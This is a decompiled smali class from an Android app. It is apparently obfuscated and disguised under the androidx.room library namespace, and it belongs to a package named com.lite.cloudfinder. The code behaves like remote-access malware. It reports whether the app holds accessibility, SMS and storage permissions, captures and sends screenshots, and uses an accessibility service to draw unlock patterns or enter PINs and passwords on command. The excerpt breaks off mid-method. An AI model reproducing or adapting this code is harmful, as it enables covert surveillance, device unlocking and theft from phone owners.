.class public final synthetic Landroidx/room/أ;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic آ:I

.field public final synthetic أ:Ljava/lang/Object;

.field public final synthetic ؤ:Ljava/lang/Object;

.field public final synthetic إ:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(ILjava/lang/String;Ljava/lang/Object;Ljava/lang/Object;)V
    .locals 0

    iput p1, p0, Landroidx/room/أ;->آ:I

    iput-object p2, p0, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    iput-object p3, p0, Landroidx/room/أ;->أ:Ljava/lang/Object;

    iput-object p4, p0, Landroidx/room/أ;->إ:Ljava/lang/Object;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;I)V
    .locals 0

    iput p4, p0, Landroidx/room/أ;->آ:I

    iput-object p1, p0, Landroidx/room/أ;->أ:Ljava/lang/Object;

    iput-object p2, p0, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    iput-object p3, p0, Landroidx/room/أ;->إ:Ljava/lang/Object;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Lڜٟٱڀ/أ;Landroid/graphics/Bitmap;)V
    .locals 1

    const/4 v0, 0x7

    iput v0, p0, Landroidx/room/أ;->آ:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Landroidx/room/أ;->أ:Ljava/lang/Object;

    iput-object p2, p0, Landroidx/room/أ;->إ:Ljava/lang/Object;

    const-string p1, "screenshot"

    iput-object p1, p0, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 22

    move-object/from16 v1, p0

    iget v0, v1, Landroidx/room/أ;->آ:I

    const-string v2, "model"

    const-string v3, "brand"

    const-string v4, "sdk"

    const-string v5, "ts"

    const-string v6, "event"

    const-string v7, "CommandDispatcher"

    const-string v8, "deviceId"

    const-string v9, ""

    packed-switch v0, :pswitch_data_0

    const/4 v0, 0x0

    goto/16 :goto_1d

    :pswitch_0
    iget-object v0, v1, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    check-cast v0, Ljava/lang/String;

    iget-object v7, v1, Landroidx/room/أ;->أ:Ljava/lang/Object;

    check-cast v7, Ljava/lang/String;

    iget-object v10, v1, Landroidx/room/أ;->إ:Ljava/lang/Object;

    check-cast v10, Landroid/content/Context;

    sget-object v11, Lڝږ؁ڋ/ر;->ؠ:Ljava/util/concurrent/ExecutorService;

    const-string v11, "DiagReporter"

    const-string v12, "ACC_LIFECYCLE: "

    :try_start_0
    new-instance v13, Lorg/json/JSONObject;

    invoke-direct {v13}, Lorg/json/JSONObject;-><init>()V

    const-string v14, "type"

    const-string v15, "acc_lifecycle"

    invoke-virtual {v13, v14, v15}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v13, v6, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v6, "reason"

    invoke-virtual {v13, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    invoke-virtual {v13, v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    const-string v5, "onServiceConnected"

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    sput-wide v5, Lڝږ؁ڋ/ر;->؋:J

    :cond_0
    const-string v5, "onDestroy"

    invoke-virtual {v5, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    sget-wide v5, Lڝږ؁ڋ/ر;->؋:J

    const-wide/16 v14, 0x0

    cmp-long v0, v5, v14

    if-lez v0, :cond_1

    const-string v0, "uptime_sec"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    sget-wide v14, Lڝږ؁ڋ/ر;->؋:J

    sub-long/2addr v5, v14

    const-wide/16 v14, 0x3e8

    div-long/2addr v5, v14

    invoke-virtual {v13, v0, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_8

    :cond_1
    const-string v0, "power"

    if-eqz v10, :cond_5

    :try_start_1
    new-instance v5, Landroid/content/IntentFilter;

    const-string v6, "android.intent.action.BATTERY_CHANGED"

    invoke-direct {v5, v6}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    const/4 v6, 0x0

    invoke-virtual {v10, v6, v5}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    move-result-object v5

    if-eqz v5, :cond_3

    const-string v6, "level"

    const/4 v7, -0x1

    invoke-virtual {v5, v6, v7}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v6

    const-string v7, "scale"

    const/16 v14, 0x64

    invoke-virtual {v5, v7, v14}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v7

    mul-int/2addr v6, v14

    div-int/2addr v6, v7

    const-string v7, "status"

    const/4 v14, -0x1

    invoke-virtual {v5, v7, v14}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v5

    const/4 v7, 0x2

    if-ne v5, v7, :cond_2

    const/4 v5, 0x1

    goto :goto_0

    :cond_2
    const/4 v5, 0x0

    :goto_0
    const-string v7, "battery"

    invoke-virtual {v13, v7, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string v6, "charging"

    invoke-virtual {v13, v6, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_3
    :try_start_2
    const-string v5, "activity"

    invoke-virtual {v10, v5}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/app/ActivityManager;

    if-eqz v5, :cond_4

    new-instance v6, Landroid/app/ActivityManager$MemoryInfo;

    invoke-direct {v6}, Landroid/app/ActivityManager$MemoryInfo;-><init>()V

    invoke-virtual {v5, v6}, Landroid/app/ActivityManager;->getMemoryInfo(Landroid/app/ActivityManager$MemoryInfo;)V

    const-string v5, "mem_avail_mb"

    iget-wide v14, v6, Landroid/app/ActivityManager$MemoryInfo;->availMem:J

    const-wide/16 v16, 0x400

    div-long v14, v14, v16

    div-long v14, v14, v16

    invoke-virtual {v13, v5, v14, v15}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    const-string v5, "mem_total_mb"

    iget-wide v14, v6, Landroid/app/ActivityManager$MemoryInfo;->totalMem:J

    div-long v14, v14, v16

    div-long v14, v14, v16

    invoke-virtual {v13, v5, v14, v15}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    const-string v5, "mem_low"

    iget-boolean v6, v6, Landroid/app/ActivityManager$MemoryInfo;->lowMemory:Z

    invoke-virtual {v13, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    :cond_4
    :try_start_3
    invoke-virtual {v10, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/os/PowerManager;

    if-eqz v5, :cond_5

    const-string v6, "interactive"

    invoke-virtual {v5}, Landroid/os/PowerManager;->isInteractive()Z

    move-result v7

    invoke-virtual {v13, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v6, "ignoring_battery_opt"

    invoke-virtual {v10}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v7}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v7

    invoke-virtual {v13, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v6, "idle_mode"

    invoke-virtual {v5}, Landroid/os/PowerManager;->isDeviceIdleMode()Z

    move-result v5

    invoke-virtual {v13, v6, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    :catch_2
    :cond_5
    if-eqz v10, :cond_c

    :try_start_4
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_8

    :try_start_5
    invoke-virtual {v10, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    const-string v6, "battery_whitelist"

    if-eqz v0, :cond_6

    invoke-virtual {v10}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v7}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_6

    const/4 v0, 0x1

    goto :goto_1

    :cond_6
    const/4 v0, 0x0

    :goto_1
    invoke-virtual {v5, v6, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    :catch_3
    :try_start_6
    invoke-virtual {v10}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v6, "enabled_accessibility_services"

    invoke-static {v0, v6}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v6, "accessibility"

    if-eqz v0, :cond_7

    invoke-virtual {v10}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_7

    const/4 v0, 0x1

    goto :goto_2

    :cond_7
    const/4 v0, 0x0

    :goto_2
    invoke-virtual {v5, v6, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :catch_4
    :try_start_7
    const-string v0, "android.permission.READ_SMS"

    invoke-virtual {v10, v0}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v0

    const-string v6, "sms"

    if-nez v0, :cond_8

    const/4 v0, 0x1

    goto :goto_3

    :cond_8
    const/4 v0, 0x0

    :goto_3
    invoke-virtual {v5, v6, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_5

    :catch_5
    :try_start_8
    const-string v0, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-virtual {v10, v0}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v0

    sget v6, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v7, 0x21

    if-lt v6, v7, :cond_9

    const-string v6, "android.permission.READ_MEDIA_IMAGES"

    invoke-virtual {v10, v6}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v6

    goto :goto_4

    :cond_9
    const/4 v6, -0x1

    :goto_4
    const-string v7, "album"

    if-eqz v0, :cond_b

    if-nez v6, :cond_a

    goto :goto_5

    :cond_a
    const/4 v0, 0x0

    goto :goto_6

    :cond_b
    :goto_5
    const/4 v0, 0x1

    :goto_6
    invoke-virtual {v5, v7, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_6

    :catch_6
    :try_start_9
    const-string v0, "permissions"

    invoke-virtual {v13, v0, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    :cond_c
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {v13, v4, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    sget-object v0, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v13, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v13, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v0

    if-eqz v0, :cond_d

    iget-object v2, v0, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    goto :goto_7

    :cond_d
    move-object v2, v9

    :goto_7
    if-eqz v2, :cond_e

    move-object v9, v2

    :cond_e
    invoke-virtual {v13, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v11, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    if-eqz v0, :cond_f

    invoke-virtual {v0}, Lڜٟٱڀ/د;->آ()Z

    move-result v2

    if-eqz v2, :cond_f

    iget-object v0, v0, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_8

    if-eqz v0, :cond_f

    :try_start_a
    const-string v2, "diag"

    invoke-virtual {v0, v2, v13}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_7

    const/4 v0, 0x1

    goto :goto_8

    :catch_7
    :cond_f
    const/4 v0, 0x0

    :goto_8
    if-nez v0, :cond_10

    :try_start_b
    invoke-static {v13}, Lڝږ؁ڋ/ر;->ؠ(Lorg/json/JSONObject;)V

    new-instance v0, Ljava/lang/Thread;

    new-instance v2, Landroidx/constraintlayout/helper/widget/؋;

    const/16 v3, 0x15

    invoke-direct {v2, v3, v13}, Landroidx/constraintlayout/helper/widget/؋;-><init>(ILjava/lang/Object;)V

    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_8

    goto :goto_9

    :catch_8
    move-exception v0

    const-string v2, "reportAccLifecycle error"

    invoke-static {v11, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_10
    :goto_9
    return-void

    :pswitch_1
    iget-object v0, v1, Landroidx/room/أ;->أ:Ljava/lang/Object;

    check-cast v0, Lڜٟٱڀ/أ;

    iget-object v2, v1, Landroidx/room/أ;->إ:Ljava/lang/Object;

    check-cast v2, Landroid/graphics/Bitmap;

    iget-object v3, v1, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    check-cast v3, Ljava/lang/String;

    iget-object v0, v0, Lڜٟٱڀ/أ;->ؠ:Lڜٟٱڀ/د;

    :try_start_c
    invoke-virtual {v2}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v4

    const/16 v5, 0x2d0

    if-le v4, v5, :cond_11

    invoke-virtual {v2}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v4

    int-to-float v4, v4

    const/high16 v6, 0x44340000    # 720.0f

    div-float/2addr v6, v4

    invoke-virtual {v2}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v4

    int-to-float v4, v4

    mul-float/2addr v4, v6

    float-to-int v4, v4

    const/4 v6, 0x1

    invoke-static {v2, v5, v4, v6}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v2

    :cond_11
    new-instance v4, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v4}, Ljava/io/ByteArrayOutputStream;-><init>()V

    sget-object v5, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v6, 0x32

    invoke-virtual {v2, v5, v6, v4}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    const/4 v4, 0x2

    invoke-static {v2, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v2

    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    const-string v5, "img"

    invoke-virtual {v4, v5, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v2, v0, Lڜٟٱڀ/د;->إ:Ljava/lang/String;

    invoke-virtual {v4, v8, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v0, v0, Lڜٟٱڀ/د;->آ:Lةؽڗںۍټ٘/ء;

    if-eqz v0, :cond_12

    invoke-virtual {v0, v3, v4}, Lةؽڗںۍټ٘/ء;->آ(Ljava/lang/String;Lorg/json/JSONObject;)Z
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_9

    goto :goto_a

    :catch_9
    move-exception v0

    const-string v2, "sendScreenshot error"

    invoke-static {v7, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_12
    :goto_a
    return-void

    :pswitch_2
    iget-object v0, v1, Landroidx/room/أ;->أ:Ljava/lang/Object;

    check-cast v0, Lڜٟٱڀ/أ;

    iget-object v2, v1, Landroidx/room/أ;->ؤ:Ljava/lang/Object;

    check-cast v2, Ljava/lang/String;

    iget-object v3, v1, Landroidx/room/أ;->إ:Ljava/lang/Object;

    check-cast v3, Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "Enter"

    const-string v5, "smartUnlock: using real patternView bounds "

    const-string v6, "smartUnlock: unknown type "

    :try_start_d
    sget-object v8, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    sget-object v8, Lسۄھؤۏ۫/؋;->إ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    if-nez v8, :cond_13

    const-string v0, "smartUnlock: no accessibility service"

    goto :goto_d

    :cond_13
    invoke-virtual {v0}, Lڜٟٱڀ/أ;->ڞ()V

    const/4 v10, 0x2

    invoke-virtual {v8, v10}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v10, 0x3e8

    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V

    const/4 v10, 0x3

    invoke-virtual {v8, v10}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v10, 0x1f4

    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V

    iget-object v0, v0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v10, v0, Landroid/util/DisplayMetrics;->widthPixels:I

    iget v0, v0, Landroid/util/DisplayMetrics;->heightPixels:I

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v11

    const v12, -0x2f271470

    if-eq v11, v12, :cond_16

    const v12, 0x1b195

    if-eq v11, v12, :cond_15

    const v12, 0x4889ba9b

    if-eq v11, v12, :cond_14

    goto :goto_b

    :cond_14
    const-string v11, "password"

    invoke-virtual {v2, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_17

    const/4 v11, 0x1

    goto :goto_c

    :cond_15
    const-string v11, "pin"

    invoke-virtual {v2, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_17

    const/4 v11, 0x0

    goto :goto_c

    :cond_16
    const-string v11, "pattern"

    invoke-virtual {v2, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_b

    if-eqz v11, :cond_17

    const/4 v11, 0x2

    goto :goto_c

    :cond_17
    :goto_b
    const/4 v11, -0x1

    :goto_c
    const-string v12, "com.android.systemui:id/key_enter"

    const-string v15, ")"

    const-string v13, ","

    if-eqz v11, :cond_25

    const/4 v4, 0x1

    if-eq v11, v4, :cond_21

    const/4 v4, 0x2

    if-eq v11, v4, :cond_18

    :try_start_e
    invoke-virtual {v6, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :goto_d
    invoke-static {v7, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_b

    goto/16 :goto_1c

    :cond_18
    :try_start_f
    invoke-virtual {v8}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_19

    goto :goto_e

    :cond_19
    const/4 v4, 0x0

    invoke-static {v2, v4}, Lڜٟٱڀ/أ;->ڤ(Landroid/view/accessibility/AccessibilityNodeInfo;I)Landroid/graphics/Rect;

    move-result-object v2
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_a

    goto :goto_f

    :catch_a
    :goto_e
    const/4 v2, 0x0

    :goto_f
    if-eqz v2, :cond_1a

    :try_start_10
    iget v0, v2, Landroid/graphics/Rect;->left:I

    iget v4, v2, Landroid/graphics/Rect;->top:I

    iget v6, v2, Landroid/graphics/Rect;->right:I

    sub-int/2addr v6, v0

    iget v10, v2, Landroid/graphics/Rect;->bottom:I

    sub-int/2addr v10, v4

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v7, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_10

    :cond_1a
    invoke-static {v10, v0}, Ljava/lang/Math;->min(II)I

    move-result v2

    mul-int/lit8 v2, v2, 0x7

    div-int/lit8 v6, v2, 0xa

    sub-int/2addr v10, v6

    div-int/lit8 v2, v10, 0x2

    div-int/lit8 v0, v0, 0x2

    div-int/lit8 v4, v6, 0x2

    sub-int v4, v0, v4

    const-string v0, "smartUnlock: patternView not found, using fallback coords"

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move v0, v2

    move v10, v6

    :goto_10
    invoke-virtual {v3, v13}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1b

    invoke-virtual {v3, v13, v9}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    :cond_1b
    new-instance v2, Landroid/graphics/Path;

    invoke-direct {v2}, Landroid/graphics/Path;-><init>()V

    const/4 v5, 0x0

    const/4 v9, 0x1

    :goto_11
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v11

    if-ge v5, v11, :cond_1f

    invoke-virtual {v3, v5}, Ljava/lang/String;->charAt(I)C

    move-result v11

    add-int/lit8 v11, v11, -0x30

    const/4 v12, 0x1

    if-lt v11, v12, :cond_1e

    const/16 v12, 0x9

    if-le v11, v12, :cond_1c

    goto :goto_13

    :cond_1c
    add-int/lit8 v12, v11, -0x1

    div-int/lit8 v14, v12, 0x3

    rem-int/lit8 v12, v12, 0x3

    mul-int/lit8 v12, v12, 0x2

    add-int/lit8 v12, v12, 0x1

    mul-int/2addr v12, v6

    div-int/lit8 v12, v12, 0x6

    add-int/2addr v12, v0

    mul-int/lit8 v14, v14, 0x2

    add-int/lit8 v14, v14, 0x1

    mul-int/2addr v14, v10

    div-int/lit8 v14, v14, 0x6

    add-int/2addr v14, v4

    if-eqz v9, :cond_1d

    int-to-float v9, v12

    move/from16 v16, v0

    int-to-float v0, v14

    invoke-virtual {v2, v9, v0}, Landroid/graphics/Path;->moveTo(FF)V

    const/4 v9, 0x0

    move/from16 v17, v4

    goto :goto_12

    :cond_1d
    move/from16 v16, v0

    int-to-float v0, v12

    move/from16 v17, v4

    int-to-float v4, v14

    invoke-virtual {v2, v0, v4}, Landroid/graphics/Path;->lineTo(FF)V

    :goto_12
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "smartUnlock: dot "

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, " -> ("

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_14

    :cond_1e
    :goto_13
    move/from16 v16, v0

    move/from16 v17, v4

    :goto_14
    add-int/lit8 v5, v5, 0x1

    move/from16 v0, v16

    move/from16 v4, v17

    goto :goto_11

    :cond_1f
    if-nez v9, :cond_20

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v0

    mul-int/lit16 v0, v0, 0x96

    const/16 v4, 0x258

    invoke-static {v0, v4}, Ljava/lang/Math;->max(II)I

    move-result v0

    new-instance v4, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v4}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    new-instance v5, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const-wide/16 v18, 0x0

    int-to-long v9, v0

    move-object/from16 v16, v5

    move-object/from16 v17, v2

    move-wide/from16 v20, v9

    invoke-direct/range {v16 .. v21}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    invoke-virtual {v4, v5}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {v4}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    const/4 v2, 0x0

    invoke-virtual {v8, v0, v2, v2}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    :cond_20
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "smartUnlock: pattern drawn "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_1b

    :cond_21
